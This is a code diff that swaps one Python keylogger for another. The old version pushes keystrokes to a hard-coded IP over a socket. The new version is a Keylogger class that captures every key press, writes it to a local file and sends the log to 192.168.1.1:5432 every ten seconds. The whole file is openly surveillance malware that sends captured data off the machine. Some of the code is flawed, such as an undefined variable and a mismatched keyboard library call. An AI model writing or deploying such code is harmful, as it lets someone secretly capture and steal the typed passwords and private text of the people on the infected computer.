@@ -1,35 +1,44 @@
-import pynput as pk
-import socket as sck
-def key_event(k):
-    l = ''
-    try:
-        l += k.char
-    except AttributeError:
-        if k == pk.keyboard.Key.space:
-            l += ' '
-        else:
-            l += f' {k} '
-    print(f'Key: {k}')
-def save_data(t):
-    with open('data.txt', 'a') as f:
-        f.write(t)
-def transmit_logs():
-    ip = '192.168.122.182'
-    p = 9000
-    skt = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
-    try:
-        skt.connect((ip, p))
-        skt.sendall(t.encode())
-        print(f'Sent to {ip}:{p}')
-    except Exception as e:
-        print(f'Failed: {e}')
-    finally:
-        skt.close()
-l = ''
-with pk.keyboard.Listener(on_press=key_event) as lstnr:
-    try:
-        lstnr.join()
-    except KeyboardInterrupt:
-        pass
-save_data(l)
-transmit_logs()
+import keyboard
+import socket
+import os
+import threading
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+    def append_to_log(self, string):
+        self.log += string
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == keyboard.Key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        print(f"Key pressed: {current_key}")
+        self.append_to_log(current_key)
+    def report(self):
+        with open("temp_logs.dat", "w") as f:
+            f.write(self.log)
+        print("Log file updated")
+        self.send_data()
+        self.log = ""
+        timer = threading.Timer(10, self.report)
+        timer.start()
+    def send_data(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("192.168.1.1", 5432))
+            s.send(self.log.encode())
+            print("Data sent to server")
+            s.close()
+        except Exception as e:
+            print(f"Failed to send data: {e}")
+    def start(self):
+        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.start()
